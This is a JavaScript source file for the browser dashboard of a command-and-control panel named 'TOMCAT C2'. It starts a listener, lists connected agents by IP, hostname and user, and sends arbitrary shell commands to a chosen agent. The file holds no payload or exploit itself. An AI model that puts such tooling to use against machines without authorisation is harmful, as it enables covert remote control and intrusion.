// TOMCAT C2 Web Interface JavaScript

let selectedAgentId = null;
let autoRefreshInterval = null;

window.onload = function() {
    refreshData();
    autoRefreshInterval = setInterval(refreshData, 3000);
};

function startServer() {
    const host = document.getElementById('hostInput').value;
    const port = document.getElementById('portInput').value;
    addLog('[*] Starting Server...', 'info');
    fetch('/api/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ host: host, port: port })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            addLog('[+] ' + data.message, 'success');
            addLog('[+] Session Key: ' + data.key, 'info');
            document.getElementById('statusDot').className = 'status-dot status-online';
            document.getElementById('statusText').textContent = 'Server Online';
            document.getElementById('serverInfo').textContent = 'Listening On: ' + data.host + ':' + data.port;
            document.getElementById('encryptionKey').textContent = data.key;
            document.getElementById('keyDisplay').style.display = 'block';
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
        } else {
            addLog('[!] Error: ' + data.message, 'error');
        }
    })
    .catch(error => {
        addLog('[!] Error: ' + error, 'error');
    });
}

function stopServer() {
    addLog('[*] Stopping server...', 'warning');
    
    fetch('/api/stop', {
        method: 'POST'
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            addLog('[!] ' + data.message, 'warning');
            document.getElementById('statusDot').className = 'status-dot status-offline';
            document.getElementById('statusText').textContent = 'Server Offline';
            document.getElementById('serverInfo').textContent = 'Ready';
            document.getElementById('keyDisplay').style.display = 'none';
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            selectedAgentId = null;
            document.getElementById('selectedAgent').textContent = 'None';
            updateAgentsTable([]);
        } else {
            addLog('[!] Error: ' + data.message, 'error');
        }
    })
    .catch(error => {
        addLog('[!] Error: ' + error, 'error');
    });
}

function refreshData() {
    fetch('/api/status')
        .then(response => response.json())
        .then(data => {
            if (data.running) {
                document.getElementById('statusDot').className = 'status-dot status-online';
                document.getElementById('statusText').textContent = 'Server Online';
                document.getElementById('startBtn').disabled = true;
                document.getElementById('stopBtn').disabled = false;
            } else {
                document.getElementById('statusDot').className = 'status-dot status-offline';
                document.getElementById('statusText').textContent = 'Server Offline';
                document.getElementById('startBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
            }
        })
        .catch(error => {
            console.error('Error fetching status:', error);
        });
    fetch('/api/agents')
        .then(response => response.json())
        .then(data => {
            updateAgentsTable(data.agents);
        })
        .catch(error => {
            console.error('Error fetching agents:', error);
        });
}

function updateAgentsTable(agents) {
    const tbody = document.getElementById('agentsTableBody');
    tbody.innerHTML = '';
    document.getElementById('agentCount').textContent = agents.length;
    if (agents.length === 0) {
        const row = document.createElement('tr');
        row.className = 'agents-table-row';
        const cell = document.createElement('td');
        cell.className = 'agents-table-cell';
        cell.setAttribute('colspan', '7');
        cell.style.textAlign = 'center';
        cell.style.color = '#ffee00';
        cell.textContent = 'No agents connected';
        row.appendChild(cell);
        tbody.appendChild(row);
        return;
    }
    agents.forEach(agent => {
        const row = document.createElement('tr');
        row.className = 'agents-table-row';
        if (selectedAgentId === agent.id) {
            row.classList.add('selected');
        }
        row.onclick = function() { selectAgent(agent.id); };
        const cells = [agent.id, agent.ip, agent.os, agent.hostname, agent.user, agent.arch, agent.joinAt];
        cells.forEach(cellData => {
            const cell = document.createElement('td');
            cell.className = 'agents-table-cell';
            cell.textContent = cellData;
            row.appendChild(cell);
        });
        tbody.appendChild(row);
    });
}

function selectAgent(agentId) {
    selectedAgentId = agentId;
    document.getElementById('selectedAgent').textContent = 'Agent ' + agentId;
    addLog('[*] Selected Agent ID: ' + agentId, 'info');
    refreshData();
}

function executeCommand() {
    if (!selectedAgentId) {
        addLog('[!] Please select an agent first!', 'error');
        return;
    }
    const command = document.getElementById('commandInput').value.trim();
    if (!command) {
        return;
    }
    addLog('\n[>>] Executing: ' + command, 'info');
    document.getElementById('commandInput').value = '';
    fetch('/api/execute', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            agent_id: selectedAgentId,
            command: command 
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            addLog('[+] Output:\n' + data.output, 'success');
            addLog('\n' + '='.repeat(60) + '\n', 'info');
        } else {
            addLog('[!] Error: ' + data.message, 'error');
        }
        refreshData();
    })
    .catch(error => {
        addLog('[!] Error: ' + error, 'error');
    });
}

function quickCommand(cmd) {
    if (!selectedAgentId) {
        addLog('[!] Please select an agent first!', 'error');
        return;
    }
    document.getElementById('commandInput').value = cmd;
    executeCommand();
}

function handleKeyPress(event) {
    if (event.key === 'Enter') {
        executeCommand();
    }
}

function addLog(message, type) {
    const outputBox = document.getElementById('outputBox');
    const logClass = 'log-' + type;
    const logEntry = document.createElement('span');
    logEntry.className = logClass;
    logEntry.textContent = message;
    outputBox.appendChild(document.createTextNode('\n'));
    outputBox.appendChild(logEntry);
    outputBox.scrollTop = outputBox.scrollHeight;
}

function clearLog() {
    const outputBox = document.getElementById('outputBox');
    outputBox.innerHTML = '';
    addLog('~>> Log cleared', 'info');
    addLog('~>> Ready for new commands...', 'info');
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}